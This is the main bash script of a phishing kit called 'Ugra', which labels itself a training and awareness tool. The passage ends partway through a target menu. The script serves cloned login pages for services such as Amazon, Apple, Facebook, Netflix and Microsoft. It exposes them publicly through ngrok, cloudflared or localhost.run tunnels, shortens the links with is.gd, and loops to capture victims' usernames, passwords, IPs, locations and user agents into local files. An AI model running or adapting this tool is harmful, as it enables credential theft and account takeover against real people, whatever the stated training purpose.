#!/bin/bash
#permissions

chmod -R 777 pack.sh
chmod -R 777 tunneling.sh
chmod -R 777 data.txt
chmod -R 777 fingerprints.txt
chmod -R 777 .host
chmod -R 777 .pages
chmod -R 777 .logs
chmod -R 777 .www


#Install packages and tunnels

check_os_and_install_packages() {


if [[ -f .host/ngrok && -f .host/cloudflared ]]; then

{ clear; }

else

{ clear; header; }

OS_SYSTEM=$(uname -o)
if [ $OS_SYSTEM != Android ]; then
     bash pack.sh
     bash tunneling.sh

else
 ./pack.sh
 ./tunneling.sh

fi

fi

}


# Check os for root

check_root_and_os() {

OS_SYSTEM=$(uname -o)

if [ $OS_SYSTEM != Android ]; then


if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; header; }
    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
    exit 1
fi

fi


}



# Terminal Colors

RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[31m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"

ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"



# Directories
if [[ ! -d ".host" ]]; then
	mkdir -p ".host"
fi

if [[ ! -d ".www" ]]; then
	mkdir -p ".www"
fi



# Clear content of log files

truncate -s 0 .logs/.cloudfl.log

truncate -s 0 .logs/.localrun.log




pid_kill() {

#kill all pid for php, ngrok and cloudflared
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi

}


header(){
    printf "${RED}"
	cat <<- EOF
${RED}
${RED} █    ██   ▄████  ██▀███   ▄▄▄
${RED} ██  ▓██▒ ██▒ ▀█▒▓██ ▒ ██▒▒████▄
${RED}▓██  ▒██░▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄
${RED}▓▓█  ░██░░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██
${RED}▒▒█████▓ ░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒
${RED}░▒▓▒ ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
${RED}░░▒░ ░ ░   ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░
${RED} ░░░ ░ ░ ░ ░   ░   ░░   ░   ░   ▒
${RED}    ░           ░    ░           ░  ░


        ${RED}Ugra is a sophisticated phishing simulation tool aimed at cybersecurity training and awareness 	${ORANGE}Version: 1.0
		${RED}        Created by ${ORANGE}Presidential Cybersecurity Club ${RED}(https://github.com/pbscybsec) ${WHITE}

	EOF

	printf "${RESETBG}"
}



log_info(){

	bold=$(tput bold)
    normal=$(tput sgr0)

    printf "${GREEN}"
	cat <<- EOF
$bold __                      __
$bold/  ___  _| _ ___|_o _ | |__    __  _|
$bold\__|(/_(_|(/_| ||_|(_|| |(_)|_|| |(_|


	EOF

	printf "${RESETBG}"
}



# Php webserver and port
host='127.0.0.1'
port='8080'


setup_clone(){

    # Setup cloned page and server
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
	rm -rf .www/*
	cp -rf .pages/"$site"/* .www
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
	cd .www && php -S "$host":"$port" > /dev/null 2>&1 &
}

## Get IP address
get_fingerprints() {
	IP=$(grep -a 'IP:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Full_Date=$(grep -a 'Full-Date:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Country=$(grep -a 'Country:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Region=$(grep -a 'Region:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    City=$(grep -a 'City:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    User_Agent=$(grep -a 'User-Agent:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    OS_System=$(grep -a 'OS-System:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Victim Fingerprints.. "
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} IP: ${BLUE}$IP"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Full Date: ${BLUE}$Full_Date"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Country: ${BLUE}$Country"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Region: ${BLUE}$Region"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} City: ${BLUE}$City"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} User-Agent: ${BLUE}$User_Agent"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} OS System: ${BLUE}$OS_System"
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Saved in : ${MAGENTA}fingerprints.txt"
	cat .www/fingerprints.txt >> fingerprints.txt
}


# Get credentials from victims
get_creds() {
	ACC=$(grep -o 'Username:.*' .www/data.txt | cut -d " " -f2)
	PASS=$(grep -o 'Password:.*' .www/data.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Account : ${WHITE}$ACC"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Password : ${WHITE}$PASS"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Saved in : ${ORANGE}data.txt"
	cat .www/data.txt >> data.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Next Fingerptints and Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}




# Get credentials from victims manual method
get_creds_manual() {
	ACC=$(tail -n 20 .www/data.txt)
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Account : ${WHITE}$ACC"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Saved in : ${ORANGE}data.txt"
	cat .www/data.txt >> data.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}


# Print credentials from victim
credentials() {

   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Victim fingerprints and Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit..."

	while true; do

		if [[ -e ".www/fingerprints.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Fingerprints Victim Found!"
			get_fingerprints
			rm -rf .www/fingerprints.txt
		fi

		sleep 0.75

		if [[ -e ".www/data.txt" ]]; then
		    echo -e "\n"
		    log_info
		    #echo -e "\n\n \033[31;5;7m Login info Found! \033[37m"
		    #echo -e "${RESETBG}"
			get_creds
			rm -rf .www/data.txt
		fi

		sleep 0.75

	done
}




# Print credentials from victim manual
credentials_manual() {

  echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Victim fingerprints and Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit..."

   while true; do

       if [[ -e ".www/fingerprints.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Fingerprints Victim Found!"
			get_fingerprints
			rm -rf .www/fingerprints.txt
		fi

		sleep 0.75

		if [[ -e ".www/data.txt" ]]; then
		    echo -e "\n"
		    log_info
		    #echo -e "\n\n \033[31;5;7m Login info Found! \033[37m"
		    #echo -e "${RESETBG}"
			get_creds_manual
			rm -rf .www/data.txt
		fi

		sleep 0.75

	done
}






# Localhost Start
localhost_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials
}



# Localhost Start customize
localhost_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone_customize
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials
}



# Localhost Start manual
localhost_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone_manual
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials_manual
}




#ngrok token setup
ngrok_setup_token() {

{ clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Ngrok Toekn
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu


	EOF


	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select Api : ${WHITE}"${WHITE}

	case $REPLY in

	    1)
	        echo "Please insert yout ngrok authtoken (only key):"
	        read authtoken

	         if [[ `command -v termux-chroot` ]]; then
              termux-chroot ./.host/ngrok authtoken $authtoken
              sleep 2 && menu

             else
                ./.host/ngrok authtoken $authtoken
                sleep 2 && menu
             fi ;;


	    99) menu;;


	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; ngrok_setup_token;};;

	esac


}


apis() {

 { clear; header; echo; }

    cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Ngrok
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu


	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select Api : ${WHITE}"${WHITE}

	case $REPLY in

        1) ngrok_setup_token;;

	    99) menu;;

	    *)
		    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Api, Try Again..."
			{ sleep 0.7; apis;};;

	esac

}






# Start ngrok
ngrok_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }

	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}

    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials
}





# Start ngrok customize
ngrok_start_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }

	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}

    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials
}





# Start ngrok manual
ngrok_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }

	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}

	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials_manual
}





# Start Cloudflared
cloudflared_start() {

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }

	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".logs/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}

	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials
}





# Start Cloudflared customize
cloudflared_start_customize() {

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }

	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".logs/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}

	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials
}





# Start Cloudflared manual
cloudflared_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }

	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".logs/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}

	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")

	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials_manual
}






# Start localrun
localhostrun_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }

	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".logs/.localrun.log")
	localrun_url1=${localrun_url#https://}

	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")

    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials
}




# Start localrun customize
localhostrun_start_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }

	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".logs/.localrun.log")
	localrun_url1=${localrun_url#https://}

	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")

    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials
}




# Start localrun manual
localhostrun_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }

	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".logs/.localrun.log")
	localrun_url1=${localrun_url#https://}

	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")

    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"

	credentials_manual
}






# Select Tunnel
tunnel() {
	{ clear; header; }
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in
		   1)
		    localhost_start;;

		   2)
		    localhostrun_start;;

		   3)
			cloudflared_start;;

		   4)
			ngrok_start;;


		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel;};;
	esac

}






# Select Tunnel customize
tunnel_customize() {
	{ clear; header; }
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in
		   1)
		    localhost_start_customize;;

		   2)
		    localhostrun_start_customize;;

		   3)
			cloudflared_start_customize;;

		   4)
			ngrok_start_customize;;


		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_customize;};;
	esac

}








start_manual_method() {

 cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 &
     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://127.0.0.1:8081 ${GREEN} for setup clone page "${WHITE}
	 echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} After setup clone page return to here and continue... "${WHITE}

}


# Select Tunnel
tunnel_manual() {
	{ clear; header; }


	 start_manual_method

	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in
		   1)
		    localhost_start_manual;;

		   2)
		    localhostrun_start_manual;;

		   3)
			cloudflared_start_manual;;

		   4)
			ngrok_start_manual;;


		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_manual;};;
	esac

}





vpn_setup() {


{ clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Psiphon Vpn
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu


	EOF


	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select Api : ${WHITE}"${WHITE}

	case $REPLY in

	    1)

	         if [[ `command -v termux-chroot` ]]; then
                  echo "https://play.google.com/store/apps/details?id=com.psiphon3.subscription"
              sleep 4 && menu

             else
                 echo "https://play.google.com/store/apps/details?id=com.psiphon3.subscription"
                 #echo 'Not Supported. Setup your vpn manual'
                sleep 4 && menu
             fi ;;


	    99) menu;;


	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; ngrok_setup_token;};;

	esac




}


attack() {

 { clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Adobe                 ${GREEN}[${WHITE}25${GREEN}]${CYAN} Line           ${GREEN}[${WHITE}49${GREEN}]${CYAN} Spotify
		${GREEN}[${WHITE}2${GREEN}]${CYAN} Amazon                ${GREEN}[${WHITE}26${GREEN}]${CYAN} LinkedIn       ${GREEN}[${WHITE}50${GREEN}]${CYAN} Stackoverflow
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Apple                 ${GREEN}[${WHITE}27${GREEN}]${CYAN} Livejournal    ${GREEN}[${WHITE}51${GREEN}]${CYAN} Steam
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Baddo                 ${GREEN}[${WHITE}28${GREEN}]${CYAN} Mediafire      ${GREEN}[${WHITE}52${GREEN}]${CYAN} Tagged
		${GREEN}[${WHITE}5${GREEN}]${CYAN} Care2                 ${GREEN}[${WHITE}29${GREEN}]${CYAN} MeWe           ${GREEN}[${WHITE}53${GREEN}]${CYAN} Telegram
		${GREEN}[${WHITE}6${GREEN}]${CYAN} Clashofclans          ${GREEN}[${WHITE}30${GREEN}]${CYAN} Microsoft      ${GREEN}[${WHITE}54${GREEN}]${CYAN} Tiktok
		${GREEN}[${WHITE}7${GREEN}]${CYAN} Crunchyroll           ${GREEN}[${WHITE}31${GREEN}]${CYAN} Mocospace      ${GREEN}[${WHITE}55${GREEN}]${CYAN} Tiktok Followers
		${GREEN}[${WHITE}8${GREEN}]${CYAN} Deviantart            ${GREEN}[${WHITE}32${GREEN}]${CYAN} Myspace        ${GREEN}[${WHITE}56${GREEN}]${CYAN} Tumblr
		${GREEN}[${WHITE}9${GREEN}]${CYAN} Discord               ${GREEN}[${WHITE}33${GREEN}]${CYAN} Netflix        ${GREEN}[${WHITE}57${GREEN}]${CYAN} Twitch
		${GREEN}[${WHITE}10${GREEN}]${CYAN} Dota2                ${GREEN}[${WHITE}34${GREEN}]${CYAN} Origin         ${GREEN}[${WHITE}58${GREEN}]${CYAN} Twitter
		${GREEN}[${WHITE}11${GREEN}]${CYAN} Dropbox              ${GREEN}[${WHITE}35${GREEN}]${CYAN} Outlook        ${GREEN}[${WHITE}59${GREEN}]${CYAN} Viber Out
		${GREEN}[${WHITE}12${GREEN}]${CYAN} Ebay                 ${GREEN}[${WHITE}36${GREEN}]${CYAN} Pinterest      ${GREEN}[${WHITE}60${GREEN}]${CYAN} Vimeo
		${GREEN}[${WHITE}13${GREEN}]${CYAN} Facebook             ${GREEN}[${WHITE}37${GREEN}]${CYAN} Playstation    ${GREEN}[${WHITE}61${GREEN}]${CYAN} Vk
